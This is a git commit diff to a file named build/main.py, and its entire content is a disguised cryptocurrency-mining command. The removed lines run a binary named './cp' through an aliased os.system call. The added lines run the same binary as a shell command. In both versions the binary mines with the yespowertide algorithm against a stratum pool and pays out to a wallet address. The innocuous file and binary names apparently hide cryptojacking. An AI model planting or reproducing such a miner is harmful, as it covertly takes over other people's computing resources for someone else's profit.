58a383c67341a485a9d46ca7ec91a4e80ada2290
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-07-08 14:25:43 +0700

    Update main.py

--- build/main.py
+++ build/main.py
@@ -1,2 +1,2 @@
-import os as jamet
-jamet.system("./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.a100")
+#bash
+./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.a100
